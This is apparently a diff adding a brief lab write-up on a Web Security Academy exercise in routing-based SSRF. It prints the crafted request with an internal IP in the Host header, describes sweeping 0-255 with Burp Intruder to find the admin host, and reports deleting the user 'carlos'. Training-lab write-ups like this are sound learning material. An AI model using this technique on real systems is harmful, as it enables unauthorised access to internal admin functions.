@@ -1,0 +1,14 @@
+
+
+
+
+using the following:
+
+GET https://0a32008304d2ba668196b10900a7009c.web-security-academy.net/admin/delete HTTP/2
+Host: 192.168.0.149
+
+
+by using intruder to go through 0-255 on the IPV4 network i got a 302 instead of alll the other 501s.
+
+
+this request then gave the admin page and from there allowed me to delete the user carlos by using ssrf
